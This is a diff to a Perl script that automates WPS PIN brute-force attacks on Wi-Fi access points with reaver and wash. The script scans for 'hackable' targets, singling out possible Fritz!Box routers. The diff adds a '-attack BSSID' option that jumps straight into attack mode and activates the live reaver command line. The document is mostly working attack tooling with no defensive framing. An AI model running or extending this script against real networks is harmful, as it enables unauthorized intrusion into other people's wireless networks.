@@ -48,11 +48,12 @@ INSTALL DOKU:
 aptitude install reaver
 
 
-===================================================
+=================================================================
  Options:
  "t5" as ARGV[0] = extreme fast timing  
- "t1" as ARGV[0] = extreme aggresive timing  
-===================================================
+ "t1" as ARGV[0] = extreme aggresive timing 
+ "-attack BSSID" = this jumps directly into the attack mode 
+==================================================================
 
 __HELP__
 #####################################################################################################
@@ -77,7 +78,7 @@ my $restarttries="3";
 my $attack_restarttries="300";
 my $logfile="/root/reaverlog";
 my $logpath="/root";
-my $cmd=""; #="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1";
+my $cmd="reaver -v -i $mondev -b $bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1";
 my $washlog="/root/washlog.out";
 my @washlog; #where to store the logfile for the wash session
 my %hoh;
@@ -90,9 +91,17 @@ my $attackable="0";
 my $washline;
 my $num="0";
 my $hackable_targets;
-
+my $direct="0";
 
 foreach (@ARGV) {
+
+	if ($_ eq "-attack") {
+		$direct="1";
+		$current_bssid=$ARGV[1];
+		print "\n::::: going directly to attack $ARGV[1]\n";
+		attack_hackable();
+	}
+
 
 	if ($_ eq "t5") {
 		print "\n::::: use fast timing 't5'";
@@ -316,7 +325,7 @@ sub parsetestattack {
 
 sub wash_parse {
 
-	print "\n::::: parseing wash results";
+	print "\n::::: parsing wash results";
 	foreach (@washlog) {
 		
 		#fixme ::::: only flag it as possible fritz!box, try the attack anyway
@@ -333,7 +342,7 @@ sub wash_parse {
 			push (@targets, $1);
 		}	
 		
-	}
+}
 
 	$possible_targets = @targets;
 	print "\n\n:::::           $possible_targets possible targets found\n\n";
@@ -474,9 +483,12 @@ sub runtestattack {
 sub attack_hackable {
 	$washline="";
 	$ap_rate_limit="0";
-	foreach (@washlog) {
-		if ($_ =~ $current_bssid ) {
-			$washline=$_;
+
+	if ($direct eq '0') { 
+		foreach (@washlog) {	
+			if ($_ =~ $current_bssid ) {
+				$washline=$_;
+			}
 		}
 	}
 	print "\n::::: ==================================================================================================================";
